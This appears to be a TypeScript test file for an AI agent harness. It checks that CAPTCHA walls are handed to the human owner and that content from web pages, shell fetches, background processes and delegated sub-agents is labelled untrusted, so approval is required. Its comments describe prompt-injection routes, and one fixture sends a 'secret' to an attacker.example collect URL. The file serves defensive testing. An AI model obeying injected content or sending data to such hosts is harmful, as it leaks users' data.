import { AthanorError } from '@athanor/core';
import { describe, expect, it } from 'vitest';
import {
  UNTRUSTED_NOTICE_MARKER,
  botWallFromError,
  botWallFromRunner,
  originsFromResult,
  providerWebProvenance,
  takeoverNotice,
  untrustedOriginOfResult,
  untrustedTurnNotice
} from './provenance.js';
import { approvalRequirement } from './tools.js';

describe('a challenge the agent cannot pass', () => {
  const wall = {
    vendor: 'Cloudflare Turnstile',
    url: 'https://careers.example.com/apply?id=7',
    reason: 'challenge frame',
    evidence: 'page',
    tabId: 'tab-2'
  };

  it('reads the wall out of a refusal, whichever route raised it', () => {
    expect(
      botWallFromError(new AthanorError('browser_bot_wall', 'Blocked', 409, { botWall: wall }))
    ).toEqual({
      vendor: 'Cloudflare Turnstile',
      url: 'https://careers.example.com/apply?id=7',
      reason: 'challenge frame',
      evidence: 'page',
      tabId: 'tab-2'
    });
    // Every other failure is an ordinary one, including a 409 that carries no wall.
    expect(botWallFromError(new AthanorError('browser_bot_wall', 'Blocked', 409))).toBeNull();
    expect(botWallFromError(new Error('Tool failed'))).toBeNull();
  });

  it('reads the wall out of a snapshot, which returns one rather than refusing', () => {
    expect(botWallFromRunner(wall)?.vendor).toBe('Cloudflare Turnstile');
    expect(botWallFromRunner(null)).toBeNull();
    expect(botWallFromRunner({ vendor: 'x' })).toBeNull();
  });

  it('records the same fields whichever half of the boundary reported it', () => {
    // The conversation reads a wall out of a tool_result and out of an error event and renders one
    // banner from either. A field carried on one path and dropped on the other is a banner that
    // says different things about the same challenge depending on which call hit it.
    const fromSnapshot = botWallFromRunner(wall);
    const fromRefusal = botWallFromError(
      new AthanorError('browser_bot_wall', 'Blocked', 409, { botWall: wall })
    );
    expect(fromRefusal).toEqual(fromSnapshot);
    expect(Object.keys(fromRefusal ?? {}).sort()).toEqual([
      'evidence',
      'reason',
      'tabId',
      'url',
      'vendor'
    ]);
    // An older runner sends neither optional field; the wall is still a wall.
    expect(
      botWallFromRunner({ vendor: 'hCaptcha', url: 'https://example.com', reason: '' })
    ).toEqual({ vendor: 'hCaptcha', url: 'https://example.com', reason: '' });
    // And a value that is not one of the two the runner declares is dropped rather than passed on.
    expect(botWallFromRunner({ ...wall, evidence: 'hearsay' })).not.toHaveProperty('evidence');
  });

  it('tells the owner which site needs them, not which tab id stopped', () => {
    // The runner's own sentence is written for the model - three lines about what is still open to
    // it - and a lock screen shows one.
    expect(takeoverNotice(botWallFromRunner(wall)!)).toBe(
      'careers.example.com is showing a Cloudflare Turnstile check only you can clear. Take over the Computer pane - the rest of the task carries on.'
    );
    expect(takeoverNotice({ vendor: 'hCaptcha', url: 'not a url', reason: '' })).toContain(
      'not a url'
    );
  });
});

/**
 * Provenance is what the approval floor is keyed on, so a channel that is attacker-reachable and
 * unclassified is not a smaller version of the problem - it is the whole problem, with a floor that
 * reports itself as holding.
 */
describe('what the turn treats as somebody else’s words', () => {
  const call = (name: string, args: Record<string, unknown> = {}) => ({
    id: 'call-1',
    name,
    arguments: args
  });

  it('remembers the hosts a read went to, so the same source is not approved twice', () => {
    // The live failure this locks out: the plainest research job stopped the owner twice to
    // approve reading the SAME host. A read establishes that host as one the turn has been to -
    // but the origins were pulled from `pages`, which the runner does not send, so nothing was
    // ever remembered and every read of an already-read host was a fresh destination.
    expect(
      originsFromResult(call('parallel_web_read'), {
        sources: [
          {
            requestedUrl: 'https://www.postgresql.org/docs/',
            url: 'https://www.postgresql.org/docs/current/'
          },
          // A source that could not be read still says where the turn went.
          { requestedUrl: 'https://example.invalid/x', error: 'Source was not read' }
        ]
      })
    ).toEqual([
      'https://www.postgresql.org/docs/current/',
      'https://www.postgresql.org/docs/',
      'https://example.invalid/x'
    ]);
    // A search already worked, and still does.
    expect(
      originsFromResult(call('web_search'), { results: [{ url: 'https://vendor.example/a' }] })
    ).toEqual(['https://vendor.example/a']);
  });

  it('labels every attacker-reachable channel, not only mail and calendar', () => {
    expect(untrustedOriginOfResult(call('web_search'), { results: [] })).toBe('web search results');
    expect(
      untrustedOriginOfResult(call('parallel_web_read'), {
        // The shape the runner actually answers with. This fixture used to say `pages`, which
        // nothing sends - so the assertion passed while the label named no host at all.
        sources: [
          { requestedUrl: 'https://vendor.example/pricing', url: 'https://vendor.example/pricing' }
        ]
      })
    ).toBe('web page vendor.example');
    expect(
      untrustedOriginOfResult(call('browser_snapshot'), { url: 'https://portal.example/apply' })
    ).toBe('browser page portal.example');
    expect(untrustedOriginOfResult(call('coding_agent', { action: 'run' }), {})).toBe(
      'coding agent report'
    );
    expect(untrustedOriginOfResult(call('shell', { network: true }), {})).toBe(
      'network command output'
    );
    // And the fetch that did not declare itself, which is what the flag was never able to catch:
    // it changes what the owner is asked, not what the command can reach.
    expect(
      untrustedOriginOfResult(
        call('shell', { executable: 'curl', args: ['https://vendor.example/brief'] }),
        {}
      )
    ).toBe('network command output');
    expect(
      untrustedOriginOfResult(
        call('shell', { executable: 'cat', args: ['workspace/downloads/terms.txt'] }),
        {}
      )
    ).toBe('downloaded file workspace/downloads/terms.txt');
    // GitHub, WebDAV and MCP arrive already enveloped by the connector layer.
    expect(
      untrustedOriginOfResult(call('connector_action'), { trust: 'untrusted', origin: 'github' })
    ).toBe('github');
  });

  it('labels what a background process printed, which nothing watched it fetch', () => {
    // `shell` is judged on the command it was handed. A `node ingest.js` that reads its URL out of
    // a config file names no address, is not a network client, and starts clean - and its output
    // arrives here, through a session id carrying nothing about what started it. The whole turn
    // used to report clean, so every sink stayed ungated.
    expect(untrustedOriginOfResult(call('process', { action: 'log', sessionId: 'p1' }), {})).toBe(
      'background process output'
    );
    expect(untrustedOriginOfResult(call('process', { action: 'poll', sessionId: 'p1' }), {})).toBe(
      'background process output'
    );
    // The three that carry only the harness's own record of sessions the agent itself started.
    for (const action of ['list', 'kill', 'write'])
      expect(untrustedOriginOfResult(call('process', { action }), {})).toBeNull();
  });

  it('leaves the owner’s own computer alone, except where a download lands', () => {
    expect(
      untrustedOriginOfResult(call('file_read', { path: 'workspace/notes.md' }), {})
    ).toBeNull();
    expect(untrustedOriginOfResult(call('shell', {}), {})).toBeNull();
    expect(
      untrustedOriginOfResult(call('shell', { executable: 'pnpm', args: ['test'] }), {})
    ).toBeNull();
    expect(untrustedOriginOfResult(call('coding_agent', { action: 'status' }), {})).toBeNull();
    expect(
      untrustedOriginOfResult(call('document_read', { path: 'workspace/downloads/terms.pdf' }), {})
    ).toBe('downloaded file workspace/downloads/terms.pdf');
  });

  /**
   * The delegate hole. A specialist runs the lead's read tools through the same executor but never
   * through the lead's provenance step, so "read these five pages and tell me what they say" used
   * to return five attacker-controlled pages, summarised by a model, into a window that the floor
   * still believed had read nothing external.
   */
  it('carries a specialist’s provenance back with its report instead of laundering it', () => {
    expect(
      untrustedOriginOfResult(call('delegate'), {
        reports: [
          {
            name: 'sources',
            report: '{"answer":"…"}',
            untrustedSources: ['web page vendor.example']
          },
          { name: 'repo', report: '{"answer":"…"}' }
        ]
      })
    ).toBe('delegated specialist (web page vendor.example)');
  });

  /**
   * The route change that would otherwise have walked around the whole model. On the provider
   * route the search runs on the provider's infrastructure and its results reach the model inside
   * the response, so no tool result is ever produced - and the two calls that used to label the
   * web, `web_search` and `parallel_web_read`, are withdrawn from the catalogue on exactly that
   * route. Without this the more capable web route would also have been the unlabelled one.
   */
  it('labels the web the provider fetched, which never comes back as a tool result', () => {
    expect(
      providerWebProvenance({
        citations: [
          { url: 'https://vendor.example/pricing', title: 'Pricing' },
          { url: 'https://vendor.example/terms', title: 'Terms' },
          { url: 'https://regulator.example/notice', title: 'Notice' }
        ],
        usage: {}
      })
    ).toEqual({
      origin: 'web page vendor.example, regulator.example',
      urls: [
        'https://vendor.example/pricing',
        'https://vendor.example/terms',
        'https://regulator.example/notice'
      ]
    });
    // A search whose results the model read and did not quote is still a search whose results it
    // read, so the spend counter is what answers when there are no citations to name a host with.
    expect(
      providerWebProvenance({ usage: { serverToolUse: { web_search_requests: 2 } } }).origin
    ).toBe('provider web search results');
    // And nothing at all on every in-house step, which is every step of every zero-retention task.
    expect(providerWebProvenance({ usage: {} }).origin).toBeNull();
    expect(
      providerWebProvenance({ usage: { serverToolUse: { web_search_requests: 0 } } }).origin
    ).toBeNull();
  });

  it('taints nothing when the specialist only read the owner’s own files', () => {
    expect(
      untrustedOriginOfResult(call('delegate'), {
        reports: [{ name: 'repo', report: '{"answer":"…"}' }]
      })
    ).toBeNull();
  });

  it('raises the floor on egress and on durable instructions while the taint is set', () => {
    const sources = ['delegated specialist (web page vendor.example)'];
    // Sending to a host the turn was never sent to. The card is written from the URL and the
    // harness's own record, never from anything the model wrote about why it wants to go there.
    const egress = approvalRequirement(
      'parallel_web_read',
      { urls: ['https://attacker.example/collect?q=secret'] },
      'balanced',
      { taintSources: sources, knownOrigins: [] }
    );
    expect(egress?.sideEffect).toBe('external_reversible');
    expect(egress?.action).toContain('attacker.example');
    expect(egress?.preview).toContain('vendor.example');
    // Writing the brief that is loaded ahead of every later task on this computer.
    expect(
      approvalRequirement('file_write', { path: 'workspace/ATHANOR.md' }, 'balanced', {
        taintSources: sources
      })
    ).not.toBeNull();
    // And the same call with a clean turn behind it is not held.
    expect(
      approvalRequirement('file_write', { path: 'workspace/ATHANOR.md' }, 'balanced', {})
    ).toBeNull();
  });

  it('tells the model what changed, once, in words it can act on', () => {
    const notice = untrustedTurnNotice(['delegated specialist (web page vendor.example)']);
    expect(notice).toContain(UNTRUSTED_NOTICE_MARKER);
    expect(notice).toContain('vendor.example');
    expect(notice).toMatch(/cannot instruct you/);
  });
});
